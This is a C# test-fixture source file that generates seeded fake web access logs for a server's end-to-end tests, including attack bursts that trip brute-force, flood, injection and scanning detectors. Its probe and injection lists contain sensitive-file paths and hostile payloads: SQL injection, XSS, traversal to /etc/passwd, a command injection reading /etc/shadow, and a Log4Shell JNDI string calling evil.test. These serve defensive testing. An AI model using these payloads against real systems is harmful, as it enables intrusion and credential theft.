using System.Globalization;
using System.Net;
using Runova.ServerCore.Contracts;
using Runova.ServerCore.Traffic;

namespace Runova.ServerCore.DevHost.Fakes;

/// <summary>
/// Access log lines in the runova_main format for the DevHost's pretend sites (E109, E110): visits
/// of people on desktops, phones and tablets from many countries (most through Cloudflare, with its
/// country and city headers, the rest straight to the server), with pages, assets, referrers, a few
/// missing pages and errors, and bots; and bursts that trip each attack detector. The same seed
/// gives the same lines, so the app's end-to-end tests can count on them.
/// </summary>
internal static class FakeTraffic
{
    private static readonly string[] _pages =
    [
        "/", "/", "/", "/pricing", "/features", "/about", "/contact", "/blog", "/blog/launch-week", "/blog/how-we-ship",
        "/blog/postgres-tips", "/docs", "/docs/getting-started", "/docs/api", "/docs/deploy", "/careers", "/changelog", "/login",
    ];

    private static readonly (string Path, string Type)[] _assets =
    [
        ("/assets/app.css", "text/css"), ("/assets/app.js", "application/javascript"), ("/images/hero.webp", "image/webp"),
        ("/favicon.ico", "image/x-icon"), ("/fonts/inter.woff2", "font/woff2"),
    ];

    private static readonly string?[] _referrers =
    [
        null, null, null, "https://www.google.com/", "https://www.google.com/", "https://duckduckgo.com/", "https://news.ycombinator.com/",
        "https://t.co/abc123", "https://www.reddit.com/r/selfhosted/", "https://github.com/runova", "https://www.bing.com/",
    ];

    private static readonly (string Agent, int Weight)[] _people =
    [
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", 30),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.2903.86", 8),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0", 8),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15", 12),
        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", 5),
        ("Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1", 18),
        ("Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36", 6),
        ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36", 10),
        ("Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1", 3),
    ];

    private static readonly string[] _bots =
    [
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36",
        "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
        "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
        "UptimeRobot/2.0 (http://www.uptimerobot.com/)",
    ];

    private static readonly (string Country, string City, string Region, int Weight)[] _places =
    [
        ("US", "Ashburn", "Virginia", 25), ("US", "San Francisco", "California", 10), ("DE", "Berlin", "Land Berlin", 12),
        ("GB", "London", "England", 9), ("FR", "Paris", "Ile-de-France", 6), ("NL", "Amsterdam", "North Holland", 5),
        ("IN", "Bengaluru", "Karnataka", 7), ("BR", "Sao Paulo", "Sao Paulo", 5), ("JP", "Tokyo", "Tokyo", 5),
        ("CA", "Toronto", "Ontario", 4), ("AU", "Sydney", "New South Wales", 3), ("SE", "Stockholm", "Stockholm County", 3),
        ("ES", "Madrid", "Madrid", 3), ("IR", "Tehran", "Tehran", 3),
    ];

    private static readonly string[] _crawlStart = ["/robots.txt", "/sitemap.xml"];

    private static readonly string[] _probes =
    [
        "/.env", "/.git/config", "/wp-config.php", "/phpmyadmin/index.php", "/.aws/credentials", "/server-status",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/config.json", "/.DS_Store", "/backup.zip",
    ];

    private static readonly string[] _injections =
    [
        "/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "/item?id=1%20or%201=1--",
        "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "/download?file=../../../../etc/passwd", "/ping?host=127.0.0.1;cat%20/etc/shadow",
        "/x?a=$%7Bjndi:ldap://evil.test/a%7D",
    ];

    /// <summary>Lines of whole visits spread over the last <paramref name="daysBack"/> days (the last hour for 0), in time order.</summary>
    public static IReadOnlyList<string> Visits(int count, int daysBack, int seed, DateTimeOffset now)
    {
        var random = new Random(seed);
        var span = daysBack > 0 ? TimeSpan.FromDays(daysBack) : TimeSpan.FromHours(1);
        var start = now - span;
        var visitors = Math.Max(20, count / 8);
        var lines = new List<(long At, string Text)>();
        while (lines.Count < count)
        {
            var visitor = random.Next(visitors);
            var address = VisitorAddress(visitor);
            var at = start + TimeSpan.FromSeconds(random.NextDouble() * Math.Max(1, (span - TimeSpan.FromMinutes(31)).TotalSeconds));
            var place = Weighted(random, _places, p => p.Weight);
            var throughCloudflare = random.NextDouble() < 0.7;
            if (random.NextDouble() < 0.1)
            {
                // A bot crawling a few pages.
                var bot = _bots[random.Next(_bots.Length)];
                foreach (var path in _crawlStart.Concat(Enumerable.Range(0, random.Next(1, 4)).Select(_ => _pages[random.Next(_pages.Length)])))
                {
                    lines.Add(Request(at, address, "GET", path, 200, path.EndsWith(".txt", StringComparison.Ordinal) ? "text/plain" : path.EndsWith(".xml", StringComparison.Ordinal) ? "application/xml" : "text/html", null, bot, throughCloudflare, place, random));
                    at += TimeSpan.FromSeconds(random.Next(1, 20));
                }

                continue;
            }

            var agent = Weighted(random, _people, p => p.Weight).Agent;
            var pages = random.NextDouble() < 0.4 ? 1 : random.Next(2, 7);
            var referrer = _referrers[random.Next(_referrers.Length)];
            for (var page = 0; page < pages; page++)
            {
                var path = _pages[random.Next(_pages.Length)];
                var roll = random.NextDouble();
                var (status, type) = roll < 0.03 ? (404, "text/html") : roll < 0.04 ? (500, "text/html") : roll < 0.12 ? (304, "-") : (200, "text/html");
                lines.Add(Request(at, address, "GET", roll < 0.03 ? "/old-page-" + random.Next(50) : path, status, type, page == 0 ? referrer : null, agent, throughCloudflare, place, random));
                foreach (var asset in _assets.Where(_ => page == 0 && random.NextDouble() < 0.6))
                {
                    lines.Add(Request(at, address, "GET", asset.Path, 200, asset.Type, "https://app.example.com" + path, agent, throughCloudflare, place, random));
                }

                at += TimeSpan.FromSeconds(random.Next(5, 240));
            }
        }

        return [.. lines.OrderBy(line => line.At).Take(count).Select(line => line.Text)];
    }

    /// <summary>A burst from one address, at <paramref name="now"/>, a little past the threshold of its kind.</summary>
    public static IReadOnlyList<string> Attack(AttackKind kind, string address, AttackThresholds thresholds, DateTimeOffset now)
    {
        ArgumentNullException.ThrowIfNull(thresholds);
        var random = new Random(address.GetHashCode(StringComparison.Ordinal));
        const string agent = "Mozilla/5.0 zgrab/0.x";
        var place = _places[random.Next(_places.Length)];
        var lines = new List<string>();
        var count = kind switch
        {
            AttackKind.BruteForce => thresholds.BruteForceAttempts + 5,
            AttackKind.Flood => thresholds.FloodRequestsPerMinute + 10,
            AttackKind.Injection => thresholds.InjectionHits + 2,
            _ => thresholds.ScanProbes + 5,
        };
        for (var i = 0; i < count; i++)
        {
            // All within the last half minute, so every window counts them together.
            var at = now - TimeSpan.FromMilliseconds((count - i) * Math.Max(1, 30_000 / count));
            lines.Add(kind switch
            {
                AttackKind.BruteForce => Request(at, address, "POST", "/wp-login.php", 200, "text/html", null, "python-requests/2.32.3", false, place, random).Text,
                AttackKind.Flood => Request(at, address, "GET", "/?page=" + i.ToString(CultureInfo.InvariantCulture), 200, "text/html", null, "Go-http-client/1.1", false, place, random).Text,
                AttackKind.Injection => Request(at, address, "GET", _injections[i % _injections.Length], 403, "text/html", null, agent, false, place, random).Text,
                _ => Request(at, address, "GET", _probes[i % _probes.Length], 404, "text/html", null, agent, false, place, random).Text,
            });
        }

        return lines;
    }

    private static (long At, string Text) Request(
        DateTimeOffset at,
        string address,
        string method,
        string path,
        int status,
        string type,
        string? referrer,
        string agent,
        bool throughCloudflare,
        (string Country, string City, string Region, int Weight) place,
        Random random)
    {
        var connecting = throughCloudflare ? $"172.70.{random.Next(1, 255)}.{random.Next(1, 255)}" : address;
        var country = throughCloudflare ? place.Country : "-";
        var city = throughCloudflare && random.NextDouble() < 0.8 ? place.City : "-";
        var region = city == "-" ? "-" : place.Region;
        var bytes = status == 304 ? 0 : random.Next(300, 60_000);
        var seconds = (random.Next(1, 400) / 1000.0).ToString("0.000", CultureInfo.InvariantCulture);
        var time = at.ToString("dd/MMM/yyyy:HH:mm:ss +0000", CultureInfo.InvariantCulture);
        var text = $"{address} - - [{time}] \"{method} {path} HTTP/1.1\" {status.ToString(CultureInfo.InvariantCulture)} {bytes.ToString(CultureInfo.InvariantCulture)} \"{referrer ?? "-"}\" \"{agent}\" "
            + $"\"app.example.com\" {seconds} \"{type}\" https {connecting} \"{country}\" \"{city}\" \"{region}\"\n";
        return (at.ToUnixTimeMilliseconds(), text);
    }

    /// <summary>A public address for a visitor (documentation and lab ranges are kept for attacks).</summary>
    private static string VisitorAddress(int visitor) =>
        visitor % 5 == 0
            ? new IPAddress([0x2a, 0x02, 0x81, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (byte)(visitor >> 8), (byte)visitor]).ToString()
            : string.Create(CultureInfo.InvariantCulture, $"{81 + (visitor % 40)}.{(visitor / 40) % 250 + 2}.{(visitor * 7) % 250 + 1}.{(visitor % 200) + 20}");

    private static T Weighted<T>(Random random, IReadOnlyList<T> items, Func<T, int> weight)
    {
        var total = items.Sum(weight);
        var pick = random.Next(total);
        foreach (var item in items)
        {
            pick -= weight(item);
            if (pick < 0)
            {
                return item;
            }
        }

        return items[^1];
    }
}

/// <summary>The DevHost never downloads DB-IP's country file: its visitors get their country from Cloudflare's headers.</summary>
internal sealed class OfflineGeoDownloads : HttpMessageHandler
{
    protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) =>
        Task.FromResult(new HttpResponseMessage(HttpStatusCode.ServiceUnavailable));
}
